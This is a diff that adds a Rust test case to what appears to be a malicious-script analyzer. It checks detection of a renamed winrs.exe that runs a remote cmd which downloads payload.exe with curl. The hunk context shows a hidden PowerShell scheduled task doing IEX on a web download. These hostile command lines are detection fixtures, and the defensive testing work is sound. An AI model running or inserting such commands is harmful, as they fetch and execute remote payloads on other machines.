@@ -3181,6 +3181,42 @@ schtasks /create /tn "Updater" /tr "powershell -w hidden \"IEX(New-Object Net.We
     }
 
     #[test]
+    fn copied_winrs_alias_replays_remote_cmd_child() {
+        let script = br#"copy C:\Windows\System32\winrs.exe C:\Users\Public\wr.tmp
+C:\Users\Public\wr.tmp -r:target.example cmd.exe /V:ON /c set U=https://copied-winrs.example/payload.exe&&curl -o payload.exe !U!"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::ManipulatedExec { target, .. }
+                    if target.eq_ignore_ascii_case(r#"C:\Users\Public\wr.tmp"#)
+            )),
+            "copied winrs alias invocation was not tied back to WindowsUtilManip: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://copied-winrs.example/payload.exe"
+                        && dst.as_deref() == Some("payload.exe")
+            )),
+            "copied winrs remote child command was not analyzed: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::RemoteExec { tool, target_host }
+                    if tool == "winrs" && target_host == "target.example"
+            )),
+            "copied winrs remote exec trait missing: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn winrm_invoke_replays_remote_cmd_child() {
         let script = br#"winrm invoke Create wmicimv2/Win32_Process -r:target.example @{CommandLine="cmd.exe /V:ON /c set U=https://winrm-wrapper.example/payload.exe&&curl -o payload.exe !U!";CurrentDirectory="C:\Windows"}"#;
         let report = analyze(script, &AnalyzeConfig::default());
